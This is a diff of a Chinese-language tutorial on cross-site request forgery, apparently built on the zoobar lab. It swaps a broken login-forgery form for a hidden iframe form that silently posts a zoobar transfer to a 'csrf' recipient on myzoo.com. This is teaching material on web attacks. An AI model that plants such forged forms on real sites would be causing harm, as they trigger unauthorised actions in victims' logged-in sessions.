@@ -44,17 +44,12 @@ http://localhost/login?username=a&password=a
 攻击者在www.attack.com/attack.html 中编写如下代码：
 
 ![POST CODE1](img/POST_2.png)
-     <form action=”http://www.target,com/login” id=”login” method=”post”>
-     <input type=text name=”username” value=””/>
-     <input type=password name=”password” value=””/>
-     <input type=submit name=”submit” value=”submit”/>
-     </form>
-     <script>
-     var a = document.getElementById(“login”);
-     a.inputs[0].value = “a”;
-     a.inputs[1].value = “a”;
-     f.submit();
-     </script>
+     <iframe name= "a" style="display:none"></iframe> 
+     <form method=POST name=transferform action="http://www.myzoo.com/transfer.php" target="a">
+     <p hidden><input name=zoobars type=text value="1" size=5> </p>
+     <p hidden><input name=recipient type=text value="csrf"></p> 
+     <input type=submit name=submission value="HELLO">
+      </form>
 
 ##CSRF Worm
 
